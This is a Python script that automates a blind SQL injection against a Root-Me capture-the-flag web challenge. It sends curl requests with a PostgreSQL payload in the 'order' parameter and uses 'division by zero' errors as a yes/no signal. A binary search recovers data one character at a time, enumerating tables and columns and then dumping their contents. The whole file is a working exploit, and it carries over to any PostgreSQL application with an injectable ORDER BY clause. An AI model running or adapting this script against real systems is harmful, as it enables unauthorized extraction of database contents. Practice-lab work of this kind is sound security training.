#!/usr/bin/python
import os
import sys

def mkchr(s):
	acc = ''
	for c in s:
		acc += "chr({0})||".format(ord(c))
	acc = acc[:-2]
	return acc

def inject(col, table, whereClause):
	l = []
	offset = 0
	finished = False
	print(table + ':')
	print(col)
	print('-'*len(col))

	while offset < 10 and not finished:
		name = ''
		pos = 1
		while pos < 128:
			sup = 128
			inf = 0
			char = 64
			while char != inf and char != sup:
				s = os.popen("curl -s 'challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,(SELECT 1/(CASE WHEN (ascii(substring((SELECT CAST({c} AS TEXT) FROM {t} {w} LIMIT 1 OFFSET {o}) from {p} for 1))>{ch}) THEN 1 ELSE 0 END))'".format(c=col, t=table, w=whereClause, o=offset, p=pos, ch=char)).read()

				if 'division by zero' in s:
					tmp = char
					char = (inf+char)/2
					sup = tmp
				else:
					tmp = char
					char = (sup+char)/2
					inf = tmp
			if char == 0:
				if name == '':
					finished = True
				else:
					l.append(name)
				break
			name += chr(char + 1)
			sys.stdout.write(chr(char+1))
			sys.stdout.flush()
			pos += 1
		sys.stdout.write('\n')
		sys.stdout.flush()
		offset += 1
	return l


print("\n# Listing tables #")

tables = inject('tablename', 'pg_tables', 'WHERE tablename NOT LIKE {0} AND tablename NOT LIKE {1}'.format(mkchr('%pg_%'), mkchr('%sql_%')))

d = {}
for t in tables:
	print("\n# Getting column names of table {0} #".format(t))
	d[t] = inject('column_name', 'information_schema.columns', 'WHERE table_name={0}'.format(mkchr(t)))


t = {}
for table,columns in d.items():
	for col in columns:
		print("\n# Getting {0} in {1} #".format(col, table))
		t[table] = {}
		t[table][col] = inject(col, table, '')

